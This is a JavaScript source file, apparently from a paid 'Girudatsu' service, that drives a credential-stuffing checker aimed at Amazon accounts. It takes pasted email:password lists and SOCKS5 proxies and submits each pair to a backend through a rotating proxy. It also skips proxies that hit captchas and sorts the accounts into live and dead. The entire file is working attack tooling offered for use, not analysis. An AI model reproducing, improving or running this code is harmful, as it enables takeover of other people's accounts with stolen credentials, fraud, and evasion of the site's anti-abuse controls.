/* girudatsu.website
 * Ver.:	1.00
 * File:	amazon.js
 * Date:
 * Desc:	Amazon API. Modified from http://iace.pw/stylecyb/js/acchckver.js
 * Copyright (C) 2015 Girudatsu Team (http://girudatsu.website)
 */


function check(mailpassIndex, proxySocksIndex, numOfFail) {

	if (lstMail["length"] < 1 || lstSock["length"] < 1 || mailpassIndex >= lstMail["length"] || proxySocksIndex >= lstSock["length"]) {
		var time_end = performance.now();
		var exec_time = ((time_end - time_start)/1000/60);
		updateExecutionTime(exec_time.toFixed(2));
	    $('#time_counter').show();
        stopLoading(true);
		return false
	};

	if (numOfFail >= maxFail && noSocks < 1) {
		updateTextBox("", lstSock[proxySocksIndex]);
		proxySocksIndex++;
		check(mailpassIndex, proxySocksIndex, 0);
		return false
	};

	$("#loading").attr ("style", "");
	$("#checkStatus").html ("<b>Account</b>: " + lstMail[mailpassIndex]).effect ("highlight", { color: "#00ff00" }, 1000);
	$("#current_socks").html ("<b>socks</b>: " + lstSock[proxySocksIndex]).effect ("highlight", { color: "#45DFC7" }, 1000);

	var email = $.trim(lstMail[mailpassIndex].split(delim)[0]);
	var password = $.trim(lstMail[mailpassIndex].split(delim)[1]);
    var method = document.getElementById("method").options[document.getElementById("method").selectedIndex].value;
    var socks5 = lstSock[proxySocksIndex];

	$.ajax ({
        url: SITE_URL,
		dataType: "json",
		type: "GET", // POST | GET
		data: {
			output: 'json',
			email: email,
			password: password,
			method: method,
            socks5: socks5
		},
		success: function(jqXHR) {
			if (!jqXHR) {
				stopLoading(true);
				bootbox.dialog ({
					title: "Alert!",
					message: "System Failure Please Contact Admin",
					buttons: {
						success: {
							label: "OK",
							className: "btn-success"
						}
					}
				});
				return false
			};

			switch (jqXHR["code"]) {
				case 0: // LIVE
					updateTextBox(lstMail[mailpassIndex], "");
					$("#tvmit_live").append (jqXHR.msg + "<br />");
                    $("#balance").html (getCookie('Girudatsu_balance'));
                    up("#count_all");up("#count_alls");up("#tvmit_live_count");up("#tvmit_live_counts");
					numOfFail = 0;
					mailpassIndex++;
					updateProgress(mailpassIndex, lstMail["length"]);
					break
				case 400: // invalid parameter
					stopLoading(false);
					bootbox.dialog ({
						title: "Alert!",
						message: jqXHR["msg"],
						buttons: {
							success: {
								label: "OK",
								className: "btn-success"
							}
						}
					});
					return false;
					break;
				case 2: // DIE
					updateTextBox(lstMail[mailpassIndex], "");
					$("#tvmit_die").append (jqXHR["msg"] + "<br />");
					up("#count_all");up("#count_alls");up("#tvmit_die_count");up("#tvmit_die_counts");
					numOfFail++;
					mailpassIndex++;
					updateProgress(mailpassIndex, lstMail["length"]);
					break;
                case 3: // socks die captcha detect
					updateTextBox("", lstSock[proxySocksIndex]);
					$("#socks-die").append (jqXHR["msg"] + "<br />");
					up(".socks-die");
					proxySocksIndex++;
                    break;
				case 4: // Another reason
					updateTextBox("", lstSock[proxySocksIndex]);
					$("#tvmit_unk").append (jqXHR["msg"] + "<br />");
					up("#tvmit_unk_count");up("#count_all");up("#tvmit_unk_counts");
					mailpassIndex++;
					updateProgress(mailpassIndex, lstMail["length"]);
					break;
                default:
					break;
			};
			if (jqXHR["error"] != 1) {
				check(mailpassIndex, proxySocksIndex, numOfFail)
			}
		},
		error: function(jqXHR, jqXHRerror, jqXHRcatchederror) {
			if(jqXHRerror=="error"){stopLoading(false);var alertMessage='';if(jqXHR.status===0){alertMessage='Can\'t connect. Check your network connection';}else if(jqXHR.status==404){alertMessage='Requested page not found. [404]';}else if(jqXHR.status==500){alertMessage='Internal Server Error [500].';}else if(jqXHRerror==='parsererror'){alertMessage='Requested JSON parse failed.';}else if(jqXHRerror==='timeout'){alertMessage='Time out error.';}else if(jqXHRerror==='abort'){alertMessage='Ajax request aborted.';}else{alertMessage='Uncaught Error. '+jqXHR.responseText;}alert("Error! Please try again or contact admin."+"\nStatus Code: "+jqXHR.status+"\nMessage: "+alertMessage+"\nCatched error: "+jqXHRcatchederror);}
		}
	});
	return true
}

$(document).ready (function() {
	$("#stop").addClass ("disabled").attr ("disabled", true).click (function() {
		stopLoading(false);
		f = "10"
	});
	$(".remove-limited").css ("cursor", "pointer").click (function() {
		$(".limited").parent ().fadeIn (100, function() {
			$(this).remove ()
		})
	});
	$("#submitPaypal").click (function() {
        time_start = performance.now();
	    $('#time_counter').hide();
		delim = $("#delim").val ().trim ();
		maxFail = parseInt($("#fail").val ());
		chkChange = $("#nochange").is (":checked") ? 1 : 0;
		noSocks = $("#noSocks").val () ? 1 : 0;
		timeout = $("#timeout").val ();
		var completeFilteredMailPass = new Array();
		if ($("#mailpass").val ().indexOf ($("#delim").val ().trim ()) != -1) {
			var completeFilteredMailPass = filterMP($("#mailpass").val ());
		}
		else
		{
			var completeFilteredMailPass = filterM_($("#mailpass").val ());
		}

		//var regexSocks = /[0-9a-zA-Z]+_[0-9a-zA-Z]+[_]{1}[0-9a-zA-Z]+/g;
		var regexSocks = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
		var filteredSocks = $("#socks").val ().match (regexSocks);
		if (filteredSocks == null) {
			bootbox.dialog ({
				title: "Alert!",
				message: "No Socks found!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};

		if (completeFilteredMailPass["length"] < 1) {
			bootbox.dialog ({
				title: "Alert!",
				message: "No Account found!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};

		$("#socks").val (filteredSocks.join ("\x0A")).attr ("disabled", true);
		$("#mailpass").val (completeFilteredMailPass.join ("\x0A")).attr ("disabled", true);
		$("#result").show ();
		$("#submit").addClass ("disabled").attr ("disabled", true);
		$("#stop").removeClass ("disabled").attr ("disabled", false);
		lstMail = completeFilteredMailPass;
		lstSock = filteredSocks;
		//resetResult();
		updateProgress(0, lstMail["length"]);
		$("#check-progress").show ("slow");
		check(0, 0, 0);
		return false
	})
})
